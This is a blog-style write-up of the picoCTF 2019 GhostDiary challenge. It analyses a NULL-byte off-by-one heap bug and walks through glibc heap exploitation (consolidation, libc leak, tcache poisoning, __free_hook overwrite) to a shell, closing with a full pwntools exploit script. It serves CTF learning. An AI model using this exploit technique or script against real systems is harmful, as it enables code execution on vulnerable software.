---
layout: post
title:  "picoCTF2019 - GhostDiary Writeup"
---

## Introduction
In this article, I summarize the process of solving the GhostDiary challenge from picoCTF 2019.

## Analysis
The challenge initiates with a binary named ghostdiary. Upon inspecting the file, it appears to be an x86_64 ELF with stripped symbols and dynamic linking.

```shell
ruser@ubuntu:~/Research/CTF/PicoCTF2019$ file ./ghostdiary
./ghostdiary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=da28ccb1f0dd0767b00267e07886470347987ce2, stripped
```

Checking for memory mitigations, I found:

```shell
ruser@ubuntu:~/Research/CTF/PicoCTF2019$ checksec --file ./ghostdiary
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Additionally, I am aware that ASLR is enabled for the system.<br/>
When running the binary, it prints the following menu:

```shell
-=-=-=[[Ghost Diary]]=-=-=-
1. New page in diary
2. Talk with ghost
3. Listen to ghost
4. Burn the page
5. Go to sleep
> 
```

Upon further investigation of the code, I deduced its purpose - to manage a book. The initial menu presents options for performing various tasks on the book:

1. Add new pages to the book.
2. Write content to the pages you have added.
3. Read the content of the pages.
4. Delete pages from the book.

This functionality is managed in the code through the definition of a struct named Page:

```c
struct Page
{
  char *content;
  size_t size;
};
```

and a global array of 20 pages referred to as a Diary:

```c
Page g_Diary[20];
```

When creating new pages, you have two options: a single-sided page or a double-sided page. Essentially, opting for a single-sided page limits the content size to a range of 0 to 240 pages, while a double-sided page allows a content size within the range of 272 to 480 pages. It’s crucial to note this distinction, as it later affects the size passed to malloc when the page is allocated on the heap and inserted into the diary by adding it to the `g_Diary` global array.

While reviewing the code that handles option 2, writing content to the diary page, I observed a NULL byte overflow on the heap, commonly referred to as an off-by-one vulnerability:

```c
unsigned __int64 __fastcall fWriteContentToPage(char *pageContent, int iPageSize)
{
  int indx; // eax
  char new_char; // [rsp+13h] [rbp-Dh] BYREF
  int count; // [rsp+14h] [rbp-Ch]
  unsigned __int64 uiCanary; // [rsp+18h] [rbp-8h]

  uiCanary = __readfsqword(0x28u);
  count = 0;
  if ( iPageSize )
  {
    while ( count != iPageSize )
    {
      if ( read(0, &new_char, 1uLL) != 1 )
      {
        puts("read error");
        exit(-1);
      }
      // Exit loop on newline
      if ( new_char == '\n' )
        break;
      indx = count++;
      // Place the read character into page content
      pageContent[indx] = new_char;
    }
    // If the loop terminates with count == iPageSize
    // This is a NULL byte off-by-one vulnerability on the heap
    pageContent[count] = 0;
  }
  return __readfsqword(0x28u) ^ uiCanary;
}
```

This section of the code is susceptible to a NULL byte off-by-one vulnerability in the event that the loop terminates with `count == iPageSize`.

Option 2, reading content from the page, is implemented by printing the content of the page to stdout:

```c
unsigned __int64 fReadPage()
{
  unsigned int iPageIndex; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Page: ");
  __isoc99_scanf("%d", &iPageIndex);
  printf("Content: ");
  if ( iPageIndex <= 19 && g_Diary[iPageIndex].content )
    puts(g_Diary[iPageIndex].content);
  return __readfsqword(0x28u) ^ v2;
}
```

Notice that it doesn’t account for the actual size of the content, which could lead to information disclosure.

Option 4, deleting a page, frees the memory associated with the content and nulls out the pointer, preventing use-after-free vulnerabilities.

```shell
unsigned __int64 fBurnThePage()
{
  unsigned int iPageIndex; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Page: ");
  __isoc99_scanf("%d", &iPageIndex);
  if ( iPageIndex <= 19 && g_Diary[iPageIndex].content )
  {
    free(g_Diary[iPageIndex].content);
    // Nulls out the content, closing the opportunity to UAF
    g_Diary[iPageIndex].content = 0LL;
  }
  return __readfsqword(0x28u) ^ v2;
}
```

It seems that there’s a NULL byte overflow vulnerability. Now, let’s explore how we can leverage this to exploit the glibc allocator and potentially achieve a full chain RCE 😄.

## Exploitation Steps
### Step 1 - Prepare 3 Adjacent Chunks in Memory

We initiate the exploitation process by creating 3 adjacent chunks in memory—namely, Page0, Page1, and Page2. Our objective is to leverage the NULL byte overflow to overwrite the least significant byte of `Page2->mchunk_size` with the data from `Page1->data`. We choose the size 0x158 for Page0 and 0x168 for Page1 and Page2, as these sizes ensure that the next byte from `Page1->data` will overwrite the least significant byte of `Page2->mchunk_size`.


This is feasible because glibc-allocated chunks are 16 bytes aligned on x86_64 systems and glibc permits the data of an allocated chunk to use the `mchunk_prev_size` of the next allocated chunk, considering this field is only relevant if the previous chunk is free.

We employ the following formula, inspired by [calc_tcache_idx.c](https://github.com/shellphish/how2heap/blob/master/calc_tcache_idx.c) from [how2heap](https://github.com/shellphish/how2heap), to calculate the real sizes of the chunks in memory. It’s important to note that the sizes in `mchunk_size` will be incremented by 1 due to the `PREV_INUSE` bit being set:

```shell
chunk_size = (((requested_size + 8 + 15) & -15) & 0xfffffff0)
```

![PagesInMemory](/assets/img/PagesInMemory.png)

### Step 2 - Move Page0 to the unsorted-bin

Our next objective is to move Page0 to the unsorted bin, thereby bypassing subsequent security checks implemented by the glibc allocator. To achieve this, we take the following steps:

We fill up the 0x158 sized tcache-bin to capacity (7 chunks). This ensures that when we free Page0 (allocated with a requested size of 0x158), it will be directed to the unsorted bin since the corresponding tcache-bin is full.

Additionally, we populate the 0xf0 sized tcache-bin. Although not immediately utilized, this will become instrumental in later stages of the exploitation.

### Step 3 - Exploiting the NULL Byte Overflow

We exploit the NULL byte overflow by writing to Page1->data and overflowing one byte into Page2->mchunk_size. This NULL byte overflow serves two crucial purposes:

**Setting `Page2->mchunk_prev_size` to 0x2d0**:
This size encompasses Page1 and Page0. It becomes significant when we later free Page2.
**Modifying `Page2->mchunk_size`**:
Originally `0x171` (binary: `101110001`), the NULL byte overflow allows us to set it to 0x100 (binary: 100000000). Notably, the least significant 8 bits are set to 0 due to the NULL byte overflow.

![NullByteOverflow](/assets/img/NullByteOverflow.png)

Page2 before the overflow is exploited:

![Page2BeforeOverflow](/assets/img/Page2BeforeOverflow.png)

And after:

![Page2AfterOverflow](/assets/img/Page2AfterOverflow.png)

### Step 4 - Backward Consolidate Page2

At this stage, our objective is to backward consolidate Page2 into a new merged free chunk that will include Page1 and Page0. In the previous step, we set `Page2->mchunk_prev_size` to encompass the size of Page1 and Page0 combined. This step is crucial because, when a chunk is freed to the unsorted bin, glibc checks the PREV_INUSE bit to determine if the previous chunk in memory is free. If it is, glibc consolidates the freed chunk with the previous one, forming a larger chunk before placing it into the unsorted bin.

However, there are some challenges we need to address when freeing and consolidating Page0:

1. **Tcache-bin Placement**: When a chunk of size `0x100` is freed, glibc attempts to place it into a tcache-bin. However, in the tcache-bin, there is no consolidation. To address this, we filled the `0xf0` size tcache-bin (`0x100 - 0x10 for metadata = 0xf0`) in the first stage, ensuring that Page2 will go into the unsorted bin upon being freed.

2. **Bypassing Security Checks**:
The first security check we need to bypass is that during the consolidation of chunks backward, glibc performs validity checks using the chunk positioned at `chunk - chunk->prev_size`, or in our case Page0. During these validity checks, glibc dereferences the fd and bk fields of that chunk. Now, recall that we freed Page0 into the unsorted bin in Step 1. When freeing chunks into the unsorted bin, glibc sets the fd and bk pointers of that chunk to point to the unsorted bin, and these pointers are addresses within libc. Therefore, the fd and bk pointers of Page0 will point to valid addresses, allowing us to avoid the segmentation fault that would have been triggered otherwise.<br/>
The second security check occurs when glibc frees a chunk, it checks that the PREV_INUSE bit of the next chunk in memory is set. If it is not set, indicating a potential double-free vulnerability, glibc terminates the freeing procedure. To bypass this security check, we need to set up a fake chunk after Page0, specifically `0x100` bytes after Page0, with its `PREV_INUSE` bit set.<br/>
By subtracting the original size of Page2 from the new size, we can calculate the fake chunk size. Adding 1 to it sets the `PREV_INUSE` bit.

```shell
0x170 - 0x100 + 1 = 0x71
```

Our free chunk looks like this:
![fake_chunk](/assets/img/fake_chunk.png) 

In actual memory:

![fake_chunk_in_mem](/assets/img/fake_chunk_in_mem.png)

Calling free results in one large consolidated chunk within the unsorted bin with a size of 0x3d0, covering all the way from Page0 to Page2.

![Page2Consolidated](/assets/img/Page2Consolidated.png)

### Step 5 - Leak Libc Address
In this step, the goal is to leak a libc pointer to defeat ASLR. The fd and bk pointers of our consolidated chunk point to the unsorted bin, which contains an address within libc. We can leverage this to leak a libc pointer. How do we get that memory into a readable memory chunk?<br/>
We start by requesting the original size of Page0 (0x158). This will fetch the memory from our consolidated chunk without data modification, and the data of the newly allocated chunk will point to what was before the fd, containing the libc address. However, there’s a small issue. If we directly request this size, it will be fetched from the tcache due to its higher priority. To overcome this, we empty the 0x158-sized tcache-bin linked list by allocating 7 chunks of size 0x158. The next allocation of 0x158 will then comes from the unsorted bin, providing us with the libc pointers we want to read.

Using the leaked heap address we can calculate the address of `__free_hook` so that we can later overwrite it to achieve RIP control upon calling free.

### Step 6 - Use-After-Free to Tcache Poisoning
To overwrite the `__free_hook` function, we need a write primitive onto its address. In this step, we use tcache-bin poisoning to trick `malloc` into returning the `__free_hook` address, allowing us to overwrite it. In the previous stage, we allocated 0x158 from the unsorted bin, which truncated our consolidated chunk to now start from the address of Page1. As we still have a pointer to Page1 (which was never freed), we can simulate a UAF vulnerability to perform tcache poisoning.<br/>
Starting by allocating the original size of Page1, 0x168. This will be fetched from the unsorted bin, providing us with a second pointer to Page1, which we’ll refer to as Page1dup. Next we free Page1, placing it into the 0x170 tcache-bin. Then, overwrite its fd pointer to point to `__free_hook` by writing to Page1dup.

![tcache_poisoning](/assets/img/tcache_poisoning.png)

At this point, after the setup described, by calling `malloc(0x168)` twice, the second call will return a pointer to `__free_hook`.

### Step 7 - Overwrite __free_hook for Remote Code Execution

With the __free_hook pointer in our possession, the final step is to overwrite it with a gadget that will execute /bin/sh for us. The process involves the following:

1. Identify a Gadget:
   Utilize tools like the One Gadget Tool to find a suitable gadget address within the libc of the running system.
2. Overwrite __free_hook
   Utilize the page pointing to __free_hook due to tcache poisoning and write the address of the RCE gadget to it.
3. Trigger Free:
   Trigger the free function to execute the gadget. This can be done by freeing a page, causing the code at the __free_hook address to be executed.
4. Receive Shell:
   Upon successful execution of the gadget, a shell will be spawned. shell


Adding exploitation code for reference:

```python
from pwn import process, p64, u64
from pwn import log as pwnlog

pwnlog.setLevel('INFO')


class GhostDiaryExploit:
    LEAK_TO_LIBC_BASE_OFFSET = -0x3ec060
    FREE_HOOK_OFFSET = 0x3ed8e8
    RCE_GADGET_OFFSET = 0x4f302

    def __init__(self):
        self._proc = process('/home/oleb/Research/CTF/PicoCTF2019/ghostdiary')

    def exploit(self):
        pwnlog.info('Preparing 3 adjacent chunks in memory')
        pwnlog.debug(self._proc.recv(4096))
        # Create Page0
        self._create_page(0x158)
        # Create Page1 and Page2
        for _ in range(2):
            self._create_page(0x168)

        pwnlog.info('Placing Page0 in the unsorted-bin')
        # Fill 344 sized tcache bin
        for _ in range(7):
            self._create_page(0x158)
        for i in range(7):
            self._free_page(i + 3)

        # Fill 240 sized tcache bin
        for _ in range(7):
            self._create_page(240)
        for i in range(7):
            self._free_page(i + 3)

        # Free Page0
        self._free_page(0)
        pwnlog.info('Using the NULL byte overflow')
        self._exploit_null_overflow(1)
        pwnlog.info('Backward consolidating Page2')
        # Create a fake chunk after Page2
        self._write_to_page(2, b'A' * 0xf0 + p64(0) + p64(0x71) + b'\n')
        # free Page2 into the unsorted bin
        self._free_page(2)
        pwnlog.info('Leaking libc address')
        # Empty 0x158 sized tcache-bin
        for _ in range(7):
            self._create_page(0x158)

        # Push libc pointers into Page1 within the unsorted-bin
        self._create_page(0x158)

        # Leak libc address through Page1
        libc_leak = self._leak_libc_address()
        pwnlog.success(f'Leaked libc address = {hex(libc_leak)}')

        pwnlog.info('Simulating UAF and triggering Tcache poisoning')
        # Simulate UAF vulnerability
        self._create_page(0x168)
        # Free page 1
        self._free_page(1)
        # use Page1dup to overwrite fd pointer
        self._write_to_page(9, p64(libc_leak + self.LEAK_TO_LIBC_BASE_OFFSET + self.FREE_HOOK_OFFSET) + b'\n')
        
        pwnlog.info('Overwriting __free_hook to RCE gadget')
        self._create_page(0x168)
        self._create_page(0x168)
        self._write_to_page(10, p64(libc_leak + self.LEAK_TO_LIBC_BASE_OFFSET + self.RCE_GADGET_OFFSET) + b'\n')
        
        pwnlog.info('Triggering free')
        self._create_page(0x21)
        # Trigger free
        self._trigger_free_hook(11)

        pwnlog.success('Going interactive')
        self._proc.interactive()

    def _create_page(self, size):
        self._proc.sendline(b'1')
        pwnlog.debug(self._proc.recv(4096))
        if size <= 240:
            self._proc.sendline(b'1')
        elif 271 < size <= 480:
            self._proc.sendline(b'2')
        pwnlog.debug(self._proc.recv(4096))
        self._proc.sendline(bytes(str(size), 'utf-8'))
        pwnlog.debug(self._proc.recv(4096))

    def _free_page(self, index):
        self._proc.sendline(b'4')
        pwnlog.debug(self._proc.recv(4096))
        self._proc.sendline(bytes(str(index), 'utf-8'))
        pwnlog.debug(self._proc.recv(4096))

    def _leak_libc_address(self):
        self._proc.sendline(b'3')
        pwnlog.debug(self._proc.recv(4096))
        self._proc.sendline(bytes(str(8), 'utf-8'))
        self._proc.recv(9)
        return u64(self._proc.recv(6).ljust(8, b'\x00'))

    def _exploit_null_overflow(self, index):
        self._write_to_page(index, b'A' * 352 + p64(0x2d0))

    def _write_to_page(self, index, data):
        self._proc.sendline(b'2')
        pwnlog.debug(self._proc.recv(4096))
        self._proc.sendline(bytes(str(index), 'utf-8'))
        pwnlog.debug(self._proc.recv(4096))
        self._proc.send(data)
        pwnlog.debug(self._proc.recv(4096))

    def _trigger_free_hook(self, index):
        self._proc.sendline(b'4')
        pwnlog.debug(self._proc.recv(4096))
        # This will trigger free hook and run execve, so we don't wait for response.
        self._proc.sendline(bytes(str(index), 'utf-8'))

    def __enter__(self):
        return self

    def __exit__(self, type_, value, traceback):
        if self._proc:
            self._proc.close()


def main():
    with GhostDiaryExploit() as ghostdiary_exploit:
        ghostdiary_exploit.exploit()


if __name__ == '__main__':
    main()
```
